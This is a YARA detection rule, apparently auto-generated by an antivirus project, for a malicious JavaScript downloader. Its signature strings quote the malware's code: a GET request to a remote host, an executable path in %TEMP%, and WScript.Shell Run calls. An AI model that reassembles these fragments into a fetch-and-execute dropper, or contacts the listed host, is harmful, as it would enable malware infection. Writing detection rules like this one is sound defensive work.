rule sig_20160328_f64818dff1d7410270c46fb0c94cfaa2 {
  meta:
    description = "datamaliciousorder - file 20160328_f64818dff1d7410270c46fb0c94cfaa2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fc24ee113fb59213f12262c4d44fddcaf60cc2ec3ed8de553b13efc6d74e93de"

  strings:
    $s1  = "function Gxmmqd() {return Vveqayky[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MyZupcuKCDh8lKoq.exe\";};" fullword ascii
    $s2  = "Rgopzctrp[Zyrks](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Xzysupplxd](Cdzlcfmi() * 11)} while (Rgopzctrp[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Vveqayky = function Bdilfpw() {return WScript[Cvxhtkfwu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Uvfllqlfv(Zellx, Oghgwi){return Zellx - Oghgwi;};" fullword ascii
    $s6  = "function Nanmvc(Xqsrbpu){Vveqayky[\"Run\"](Xqsrbpu, Qqdcxba, Qqdcxba);};" fullword ascii
    $s7  = "function Zbuff() {return ((Ztkmkxvcwr == true) && (Ztkmkxvcwr == Osnfcsks)) ? 1 : Qqdcxba;};" fullword ascii
    $s8  = "var Ztkmkxvcwr = false;" fullword ascii
    $s9  = "function Dsriwwa()" fullword ascii
    $s10 = "function Cdzlcfmi(){return 22;};" fullword ascii
    $s11 = "return Uvfllqlfv(Cijbyhvldz, Azqamuq);" fullword ascii
    $s12 = "Ztkmkxvcwr = true; " fullword ascii
    $s13 = "Osnfcsks = true; " fullword ascii
    $s14 = "var Osnfcsks = false;" fullword ascii
    $s15 = "function Bmtioxv(Evcgr) {var Scifesw = (1, 2, 3, 4, 5, Evcgr); return Scifesw;};" fullword ascii
    $s16 = "var Dyfqlaaml = new this[\"Date\"]();" fullword ascii
    $s17 = "var Afgrgl = false;" fullword ascii
    $s18 = " while (Quvfgfbwjb){" fullword ascii
    $s19 = "function Ampxtuqkpu(){return Cvxhtkfwu;};" fullword ascii
    $s20 = "function Vrcdsqe(){return Bdnqb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}